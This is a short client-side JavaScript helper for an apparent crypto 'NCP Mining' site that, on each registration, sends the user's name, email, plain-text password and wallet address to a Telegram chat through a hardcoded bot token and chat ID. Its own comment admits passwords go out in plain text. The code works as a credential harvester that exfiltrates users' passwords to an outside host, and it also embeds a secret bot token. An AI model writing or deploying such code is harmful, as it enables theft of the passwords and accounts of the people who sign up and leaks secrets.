/**
 * Telegram Notification Helper for NCP Mining
 * -------------------------------------------
 * Bot token and chat ID as requested.
 *
 * ⚠️ SECURITY WARNING:
 * - Token is visible in client-side code.
 * - Passwords are sent in PLAIN TEXT to Telegram.
 * - Move this to a secure backend before production.
 */

const TELEGRAM_BOT_TOKEN = "8848782287:AAGvtPe3Kv_7xhf66DKQ_yBLCILjlfh0NvM";
const TELEGRAM_CHAT_ID = "7865970264";

function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function buildRegistrationMessage(user) {
  const now = new Date();
  const timeStr = now.toLocaleString("en-GB", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  return (
    "🚀 <b>New NCP Mining User Registered!</b>\n" +
    "━━━━━━━━━━━━━━━━━━━━\n" +
    "👤 <b>Name:</b> " + escapeHtml(user.name) + "\n" +
    "📧 <b>Email (Gmail):</b> " + escapeHtml(user.email) + "\n" +
    "🔑 <b>Password:</b> <code>" + escapeHtml(user.password) + "</code>\n" +
    "💳 <b>Wallet:</b> <code>" + (user.wallet || "") + "</code>\n" +
    "🕒 <b>Time:</b> " + timeStr + "\n" +
    "━━━━━━━━━━━━━━━━━━━━\n" +
    "💎 Welcome to NCP Mining!"
  );
}

async function sendRegistrationToTelegram(user) {
  const message = buildRegistrationMessage(user);
  const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true
      })
    });

    const data = await response.json();
    if (data && data.ok) {
      console.log("✅ Registration notified on Telegram");
      return true;
    }
    console.warn("Telegram API error:", data);
    return false;
  } catch (err) {
    console.error("Failed to send Telegram message:", err);
    return false;
  }
}

window.sendRegistrationToTelegram = sendRegistrationToTelegram;
